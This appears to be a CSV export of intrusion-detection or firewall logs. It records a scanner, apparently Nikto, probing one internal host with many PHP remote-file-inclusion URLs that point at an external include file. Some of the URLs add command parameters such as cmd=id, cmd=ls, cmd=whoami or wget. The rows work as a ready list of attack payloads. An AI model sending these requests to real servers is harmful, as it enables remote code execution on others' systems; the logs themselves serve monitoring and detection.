ID_regla,sessionid,repeatcnt,severity_number,Nombre_regla,thread_category,prot,src_ip,dst_ip,log_subtype,extra_data
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/digitaleye_Path/module.php?menu=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dir/prepend.php?_PX_config[manager_path]=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dir_thatware/config.php?root_path=http://cirt.net/rfiinc.txt?'
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/direct.php?rf=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/direction/index.php?repertoire_config=http://cirt.net/rfiinc.txt?
33327,415442,214,3,PHP Remote File Include Vulnerability,code-execution,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/0_admin/modules/Wochenkarte/frontend/index.php?x_admindir=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/directory/index.php?path=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/display.php?pag=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/display.php?path=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/displayCategory.php?basepath=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dix.php3?url_phpartenaire=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dm-albums/template/album.php?SECURITY_FILE=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/doc/admin/index.php?ptinclude=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/doceboCore/lib/lib.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/doceboKms/modules/documents/lib.filelist.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/doceboKms/modules/documents/tree.documents.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/doceboLms/lib/lib.repo.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/doceboScs/lib/lib.teleskill.php?GLOBALS[where_scs]=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/docebocms/lib/lib.simplesel.php?GLOBALS[where_framework]=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/docs/front-end-demo/cart2.php?workdir=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dokeos/claroline/resourcelinker/resourcelinker.inc.php?clarolineRepositorySys=http://cirt.net/rfiinc.txt??&cmd=wget%20XXpathXX
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dosearch.php?RESPATH=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/download.php?root_prefix=http://cirt.net/rfiinc.txt?
9999,415442,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/download.php?root_prefix=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/download_engine_V1.4.3/addmember.php?eng_dir=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/download_engine_V1.4.3/admin/enginelib/class.phpmailer.php?lang_pathr=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/download_engine_V1.4.3/admin/includes/spaw/dialogs/colorpicker.php?spaw_root=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/downstat1.8/chart.php?art=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/dp_logs.php?HomeDir=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/eXPerience2/modules.php?file=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ea-gBook/index_inc.php?inc_ordner=http://cirt.net/rfiinc.txt??&act=cmd&cmd=whoami&d=/&submit=1&cmd_txt=1
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/edit.php?javascript_path=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/editor.php?newsfile=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/editprofile.php?pathtohomedir=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/editsite.php?returnpath=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/editx/add_address.php?include_dir=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/contenus.php?contenus=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/moduleajouter/articles/fonctions.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/moduleajouter/articles/usrarticles.php?corpsdesign=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/moduleajouter/depot/fonctions.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/moduleajouter/depot/usrdepot.php?corpsdesign=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/moduleajouter/depot/usrdepot.php?corpsdesignhttp://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/utilisateurs/coeurusr.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/utilisateurs/commentaire.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/utilisateurs/enregistrement.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/utilisateurs/espaceperso.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/elseif/utilisateurs/votes.php?tpelseifportalrepertoire=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/email_subscribe.php?root_prefix=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/email_subscribe.php?root_prefix=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/embed/day.php?path=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/enc/content.php?Home_Path=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/engine/Ajax/editnews.php?root_dir=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/engine/api/api.class.php?dle_config_api=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/engine/engine.inc.php?absolute_path=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/engine/init.php?root_dir=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/engine/require.php?MY_ENV[BASE_ENGINE_LOC]=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/enth3/show_joined.php?path=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/environment.php?DIR_PREFIX=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/epal/index.php?view=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/errors.php?error=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/errors/configmode.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/errors/reconfigure.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/errors/unconfigured.php?GALLERY_BASEDIR=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/es_custom_menu.php?files_dir=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/es_desp.php?files_dir=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/es_offer.php?files_dir=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/eshow.php?Config_rootdir=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/esupport/admin/autoclose.php?subd=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/eva/index.php3?aide=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/eva/index.php3?aide=http://cirt.net/rfiinc.txt??
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/eva/index.php3?perso=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/eva/index.php?eva[caminho]=http://cirt.net/rfiinc.txt?
9999,415453,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/event.php?myevent_path=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/event_cal/module/embed/day.php?path=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/eventcal2.php.php?path_simpnews=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/eventscroller.php?path_simpnews=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/example-view/templates/article.php?globals[content_dir]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/example-view/templates/dates_list.php?globals[content_dir]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/example-view/templates/root.php?globals[content_dir]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/example.php?site=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/example/gamedemo/inc.functions.php?projectPath=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/examplefile.php?bibtexrootrel=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/examples/patExampleGen/bbcodeSource.php?example=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/exception/include.php?_APP_RELATIVE_PATH=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/extauth/drivers/ldap.inc.php?clarolineRepositorySys=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/extras/mt.php?web_root=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/extras/poll/poll.php?file_newsportal=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ezusermanager_pwd_forgott.php?ezUserManager_Path=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/faq.php?module_root_path=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/faq.php?phpbb_root_path=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/fckeditor/editor/dialog/fck_link.php?dirroot=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Dirroot=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?dirroot=http://cirt.net/rfiinc.txt??&cmd=id
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/fcring.php?s_fuss=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/feed.php?config[root_ordner]=http://cirt.net/rfiinc.txt??&cmd=id
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/feed/index2.php?m=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/amazon-bestsellers.php?CarpPath=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/carprss.php?CarpPath=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/compose-attach.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/compose-menu.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/compose-new.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/compose-send.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/folder-create.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/folder-delete.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/folder-empty.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/folder-reNikto.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/folder-rename.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/folders.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/login.php3?err=hack&BSX_HTXDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/mainfile.php?page[path]=http://cirt.net/rfiinc.txt??&cmd=ls
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/mbox-list.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/message-delete.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/message-forward.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/message-header.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/message-print.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/message-read.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/message-reply.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/message-replyall.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/files/message-search.php3?BSX_LIBDIR=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/findix/index.php?page=http://cirt.net/rfiinc.txt??&cmd=id
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/fishcart_v3/fc_functions/fc_example.php?docroot=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/flushcmd/Include/editor/rich_files/class.rich.php?class_path=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/fonctions/template.php?repphp=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/fonctions_racine.php?chemin_lib=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/footer.inc.php?settings[footer]=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/footer.inc.php?tfooter=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/footer.inc.php?tfooter=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/footer.php?footer_file=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/footer.php?op[footer_body]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/form.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum.php?cfg_file=1&fpath=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum/forum.php?view=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum/forum82lib.php3?repertorylevel=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum/gesfil.php?repertorylevel=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum/lostpassword.php?repertorylevel=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum/mail.php?repertorylevel=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum/member.php?repertorylevel=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum/message.php?repertorylevel=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum/search.php?repertorylevel=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/forum/track.php?path=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/frame.php?framefile=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/ftp.php?path_local=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/function.inc.php?path=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/function.php?adminfolder=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/function.php?gbpfad=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions.php?include_path=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions.php?pmp_rel_path=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions.php?s[phppath]=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions.php?set_path=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions/form.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions/general.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions/groups.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions/js.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions/prepend_adm.php?SETS[path][physical]=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions/prepend_adm.php?SETS[path][physical]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions/sections.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions/users.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/functions_mod_user.php?phpbb_root_path=http://cirt.net/rfiinc.txt??&cmd=ls
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/fusebox5.php?FUSEBOX_APPLICATION_PATH=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/galerie.php?config[root_ordner]=http://cirt.net/rfiinc.txt??cmd=id
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/gallery/lib/content.php?include=http://cirt.net/rfiinc.txt??cmd=ls
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/gallery/theme/include_mode/template.php?galleryfilesdir=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/gallerypath/index.php?includepath=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/games.php?id=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/games.php?scoreid=http://cirt.net/rfiinc.txt?
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/gbook/includes/header.php?abspath=http://cirt.net/rfiinc.txt??
9999,415454,1,1,,N/A,tcp,172.16.1.2,172.16.2.2,url,172.16.2.2/gemini/page/forums/bottom.php?lang=http://cirt.net/rfiinc.txt??
31932,415443,1,4,Comet WebFileManager CheckUpload.php Language Parameter PHP File Include Vulnerability,code-execution,tcp,172.16.1.2,172.16.2.2,vulnerability,172.16.2.2/CheckUpload.php?Language=http://cirt.net/rfiinc.txt?&cmd=ls
